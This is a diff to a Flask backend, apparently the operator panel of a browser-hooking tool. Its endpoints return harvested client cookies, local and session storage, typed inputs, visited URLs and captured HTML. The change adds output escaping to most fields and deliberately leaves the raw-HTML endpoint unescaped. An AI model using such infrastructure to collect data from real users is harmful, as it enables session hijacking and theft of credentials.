@@ -666,8 +666,8 @@ def recordSessionStorageEntry(identifier):
 def getClients():
     clients = Client.query.all()
 
-    allClients = [{'id':client.id, 'nickname':client.nickname, 'notes':client.notes, 
-        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen} for client in clients]
+    allClients = [{'id':escape(client.id), 'nickname':escape(client.nickname), 'notes':escape(client.notes), 
+        'firstSeen':escape(client.firstSeen), 'lastSeen':escape(client.lastSeen)} for client in clients]
 
     return jsonify(allClients)
 
@@ -683,8 +683,8 @@ def getClientEvents(id):
 
     events = Event.query.filter_by(clientID=clientName)
 
-    eventData = [{'id':event.id, 'timeStamp':event.timeStamp, 
-        'eventType':event.eventType, 'eventID':event.eventID} for event in events]
+    eventData = [{'id':escape(event.id), 'timeStamp':escape(event.timeStamp), 
+        'eventType':escape(event.eventType), 'eventID':escape(event.eventID)} for event in events]
 
     return jsonify(eventData)
 
@@ -695,7 +695,7 @@ def getClientEvents(id):
 def getClientScreenshots(key):
     screenshot = Screenshot.query.filter_by(id=key).first()
 
-    screenshotData = {'fileName':screenshot.fileName}
+    screenshotData = {'fileName':escape(screenshot.fileName)}
     
 
     return jsonify(screenshotData)
@@ -708,6 +708,8 @@ def getClientHtml(key):
     htmlCode = HtmlCode.query.filter_by(id=key).first()
 
     # htmlData = {'url':htmlCode.url, 'code':escape(htmlCode.code)}
+
+    # This one shouldn't be escaped
     htmlData = {'url':htmlCode.url, 'code':htmlCode.code}
     
 
@@ -720,7 +722,7 @@ def getClientHtml(key):
 def getClientUrls(key):
     urlsVisited = UrlVisited.query.filter_by(id=key).first()
 
-    urlData = {'url':urlsVisited.url}
+    urlData = {'url':escape(urlsVisited.url)}
     
 
     return jsonify(urlData)
@@ -732,7 +734,7 @@ def getClientUrls(key):
 def getClientUserInputs(key):
     userInput = UserInput.query.filter_by(id=key).first()
 
-    userInputData = {'inputName':userInput.inputName, 'inputValue':userInput.inputValue}
+    userInputData = {'inputName':escape(userInput.inputName), 'inputValue':escape(userInput.inputValue)}
     
 
     return jsonify(userInputData)
@@ -745,7 +747,7 @@ def getClientCookies(key):
     print("*** In cookie lookup, key is: " + key)
     cookie = Cookie.query.filter_by(id=key).first()
 
-    cookieData = {'cookieName':cookie.cookieName, 'cookieValue':cookie.cookieValue}
+    cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
     
 
     return jsonify(cookieData)
@@ -761,7 +763,7 @@ def getClientLocalStorage(key):
     localStorage = LocalStorage.query.filter_by(id=key).first()
     print("Sending back: " + localStorage.key + ":" + localStorage.value)
     
-    localStorageData = {'localStorageKey':localStorage.key, 'localStorageValue':localStorage.value}
+    localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
     
 
     return jsonify(localStorageData)
@@ -774,7 +776,7 @@ def getClientLocalStorage(key):
 def getClientSesssionStorage(key):
     sessionStorage = SessionStorage.query.filter_by(id=key).first()
     
-    sessionStorageData = {'sessionStorageKey':sessionStorage.key, 'sessionStorageValue':sessionStorage.value}
+    sessionStorageData = {'sessionStorageKey':escape(sessionStorage.key), 'sessionStorageValue':escape(sessionStorage.value)}
     
 
     return jsonify(sessionStorageData)
